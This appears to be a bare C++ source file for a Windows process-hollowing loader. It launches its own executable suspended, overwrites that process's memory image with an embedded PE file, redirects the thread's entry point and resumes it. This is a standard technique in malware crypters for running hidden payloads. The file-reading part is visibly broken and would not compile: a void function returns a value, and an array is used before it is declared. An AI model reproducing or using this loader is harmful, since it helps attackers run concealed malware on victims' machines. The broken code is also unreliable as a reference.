// compile under VC with: cl /EHsc embed.cpp
#include <windows.h>
#include <iostream>
#include<string> // for string class
SECURITY_ATTRIBUTES secAttrib;
#define _CRT_SECURE_NO_WARNINGS
using namespace std;
void RunFromMemory(char*, char*);



// Read file from filepath and convert it into hex
void ReadFile(char* filepath)
{
	FILE* fp = fopen(filepath, "rb");
	if (fp == NULL)
	{
		printf("Failed to open file\n");
		return;
	}
	fseek(fp, 0, SEEK_END);
	int size = ftell(fp);
	fseek(fp, 0, SEEK_SET);
	char* buffer = new char[size];
	fread(buffer, size, 1, fp);
	fclose(fp);

	for (int i = 0; i < size; i++)
	{
		_image_[i] = buffer[i];
	}
	return _image;
}
	
char _image_[] = ReadFile("");

int main(int argc, char* argv[])
{
    char current_file_path[1024];
    GetModuleFileNameA(0, current_file_path, 1024); // Path to current executable.
    RunFromMemory(_image_, current_file_path);
    return 0;
}

void RunFromMemory(char* pImage, char* pPath)
{
    DWORD dwWritten = 0;
    DWORD dwHeader = 0;
    DWORD dwImageSize = 0;
    DWORD dwSectionCount = 0;
    DWORD dwSectionSize = 0;
    DWORD firstSection = 0;
    DWORD previousProtection = 0;
    DWORD jmpSize = 0;

    IMAGE_NT_HEADERS INH;
    IMAGE_DOS_HEADER IDH;
    IMAGE_SECTION_HEADER Sections[1000];

    PROCESS_INFORMATION peProcessInformation;
    STARTUPINFO peStartUpInformation;
    CONTEXT pContext;

    char* pMemory;
    char* pFile;
    memcpy(&IDH, pImage, sizeof(IDH));
    memcpy(&INH, (void*)((DWORD)pImage + IDH.e_lfanew), sizeof(INH));

    dwImageSize = INH.OptionalHeader.SizeOfImage;
    pMemory = (char*)malloc(dwImageSize);
    memset(pMemory, 0, dwImageSize);
    pFile = pMemory;

    dwHeader = INH.OptionalHeader.SizeOfHeaders;
    firstSection = (DWORD)(((DWORD)pImage + IDH.e_lfanew) + sizeof(IMAGE_NT_HEADERS));
    memcpy(Sections, (char*)(firstSection), sizeof(IMAGE_SECTION_HEADER) * INH.FileHeader.NumberOfSections);

    memcpy(pFile, pImage, dwHeader);

    if ((INH.OptionalHeader.SizeOfHeaders % INH.OptionalHeader.SectionAlignment) == 0)
    {
        jmpSize = INH.OptionalHeader.SizeOfHeaders;
    }
    else
    {
        jmpSize = INH.OptionalHeader.SizeOfHeaders / INH.OptionalHeader.SectionAlignment;
        jmpSize += 1;
        jmpSize *= INH.OptionalHeader.SectionAlignment;
    }

    pFile = (char*)((DWORD)pFile + jmpSize);

    for (dwSectionCount = 0; dwSectionCount < INH.FileHeader.NumberOfSections; dwSectionCount++)
    {
        jmpSize = 0;
        dwSectionSize = Sections[dwSectionCount].SizeOfRawData;
        memcpy(pFile, (char*)(pImage + Sections[dwSectionCount].PointerToRawData), dwSectionSize);

        if ((Sections[dwSectionCount].Misc.VirtualSize % INH.OptionalHeader.SectionAlignment) == 0)
        {
            jmpSize = Sections[dwSectionCount].Misc.VirtualSize;
        }
        else
        {
            jmpSize = Sections[dwSectionCount].Misc.VirtualSize / INH.OptionalHeader.SectionAlignment;
            jmpSize += 1;
            jmpSize *= INH.OptionalHeader.SectionAlignment;
        }
        pFile = (char*)((DWORD)pFile + jmpSize);
    }


    memset(&peStartUpInformation, 0, sizeof(STARTUPINFO));
    memset(&peProcessInformation, 0, sizeof(PROCESS_INFORMATION));
    memset(&pContext, 0, sizeof(CONTEXT));

    peStartUpInformation.cb = sizeof(peStartUpInformation);
    if (CreateProcess(NULL, pPath, &secAttrib, NULL, false, CREATE_SUSPENDED, NULL, NULL, &peStartUpInformation, &peProcessInformation))
    {
        pContext.ContextFlags = CONTEXT_FULL;
        GetThreadContext(peProcessInformation.hThread, &pContext);
        VirtualProtectEx(peProcessInformation.hProcess, (void*)((DWORD)INH.OptionalHeader.ImageBase), dwImageSize, PAGE_EXECUTE_READWRITE, &previousProtection);
        WriteProcessMemory(peProcessInformation.hProcess, (void*)((DWORD)INH.OptionalHeader.ImageBase), pMemory, dwImageSize, &dwWritten);
        WriteProcessMemory(peProcessInformation.hProcess, (void*)((DWORD)pContext.Ebx + 8), &INH.OptionalHeader.ImageBase, 4, &dwWritten);
        pContext.Eax = INH.OptionalHeader.ImageBase + INH.OptionalHeader.AddressOfEntryPoint;
        SetThreadContext(peProcessInformation.hThread, &pContext);
        VirtualProtectEx(peProcessInformation.hProcess, (void*)((DWORD)INH.OptionalHeader.ImageBase), dwImageSize, previousProtection, 0);
        ResumeThread(peProcessInformation.hThread);
    }
    free(pMemory);
}